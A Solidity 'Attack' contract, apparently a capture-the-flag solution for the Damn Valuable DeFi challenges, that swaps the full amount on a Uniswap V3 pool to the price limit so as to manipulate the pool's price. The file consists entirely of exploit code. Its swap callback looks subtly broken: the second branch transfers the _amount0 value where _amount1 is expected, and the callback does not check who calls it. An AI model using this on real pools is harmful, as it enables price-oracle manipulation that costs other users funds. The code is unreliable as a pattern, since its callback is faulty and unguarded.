// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attack {
    IUniswapV3Pool public immutable UNISWAP_POOL;
    WETH public immutable weth;
    DamnValuableToken public immutable TOKEN;

    constructor(IUniswapV3Pool _uniswapPool, WETH _weth, DamnValuableToken _token) {
        UNISWAP_POOL = _uniswapPool;
        weth = _weth;
        TOKEN = _token;
    }

    function swap(uint256 _amount) external {
        bool isTokenFirst = address(TOKEN) < address(weth);

        UNISWAP_POOL.swap(
            msg.sender,
            isTokenFirst,
            int256(_amount),
            isTokenFirst ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1,
            bytes("")
        );
    }

    function uniswapV3SwapCallback(int256 _amount0, int256 _amount1, bytes calldata) external {
        bool isTokenFirst = address(TOKEN) < address(weth);

        if (_amount0 > 0) {
            isTokenFirst
                ? TOKEN.transfer(msg.sender, uint256(_amount0))
                : weth.transfer(msg.sender, uint256(_amount0));
        }

        if (_amount1 > 0) {
            isTokenFirst
                ? weth.transfer(msg.sender, uint256(_amount0))
                : TOKEN.transfer(msg.sender, uint256(_amount0));
        }
    }
}